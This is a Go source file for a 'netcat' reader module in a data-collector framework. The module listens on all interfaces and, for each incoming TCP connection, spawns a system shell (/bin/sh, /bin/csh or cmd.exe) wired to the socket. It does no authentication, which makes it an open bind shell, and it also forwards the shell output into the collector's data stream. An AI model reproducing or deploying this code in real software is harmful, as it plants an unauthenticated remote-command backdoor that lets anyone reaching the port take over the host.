package netcat

import (
	"fmt"
	"lego_datacollector/modules/datacollector/core"
	"lego_datacollector/modules/datacollector/reader"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"sync"

	"github.com/axgle/mahonia"
)

type Reader struct {
	reader.Reader
	options  IOptions //以接口对象传递参数 方便后期继承扩展
	listener net.Listener
	lock     sync.RWMutex
	conns    map[string]net.Conn
}

func (this *Reader) Init(runner core.IRunner, reader core.IReader, meta core.IMetaerData, options core.IReaderOptions) (err error) {
	if err = this.Reader.Init(runner, reader, meta, options); err != nil {
		return
	}
	this.options = options.(IOptions)
	if this.listener, err = net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", this.options.GetNetcat_listen_port())); err != nil {
		return
	}
	this.conns = make(map[string]net.Conn)
	return
}

func (this *Reader) Start() (err error) {
	err = this.Reader.Start()
	go this.tcp_run()
	return
}
func (this *Reader) Close() (err error) {
	this.listener.Close()
	err = this.Reader.Close()
	return
}

//---------------------------------------------------------------------------
func (this *Reader) tcp_run() {
loop:
	for {
		if conn, err := this.listener.Accept(); err == nil {
			go func(c net.Conn) {
				defer this.removeConnection(c)
				defer c.Close()
				var shell string
				switch runtime.GOOS {
				case "linux":
					shell = "/bin/sh"
				case "freebsd":
					shell = "/bin/csh"
				case "windows":
					shell = "cmd.exe"
				default:
					shell = "/bin/sh"
				}
				cmd := exec.Command(shell)
				cmdconn := newComdConn(c, this)
				cmd.Stdin = cmdconn
				cmd.Stdout = cmdconn
				cmd.Stderr = cmdconn
				cmd.Run()
			}(conn)
		} else {
			break loop
		}
	}
	fmt.Printf("run exit")
}
func (this *Reader) removeConnection(conn net.Conn) {
	this.lock.Lock()
	delete(this.conns, conn.LocalAddr().String())
	this.lock.Unlock()
}
func newComdConn(c net.Conn, reder core.IReader) *ComdConn {
	convert := new(ComdConn)
	convert.conn = c
	convert.reder = reder
	return convert
}

type ComdConn struct {
	conn  net.Conn
	reder core.IReader
}

func (convert *ComdConn) translate(p []byte, encoding string) []byte {
	srcDecoder := mahonia.NewDecoder(encoding)
	_, resBytes, _ := srcDecoder.Translate(p, true)
	return resBytes
}
func (this *ComdConn) Write(p []byte) (n int, err error) {
	switch runtime.GOOS {
	case "windows":
		resBytes := this.translate(p, "gbk")
		this.reder.Input() <- core.NewCollData(this.conn.RemoteAddr().String(), string(resBytes))
		m, err := this.conn.Write(resBytes)
		if m != len(resBytes) {
			return m, err
		}
		return len(p), err
	default:
		this.reder.Input() <- core.NewCollData(strings.Split(this.conn.RemoteAddr().String(), ":")[0], string(p))
		return this.conn.Write(p)
	}
}

func (this *ComdConn) Read(p []byte) (n int, err error) {
	return this.conn.Read(p)
}
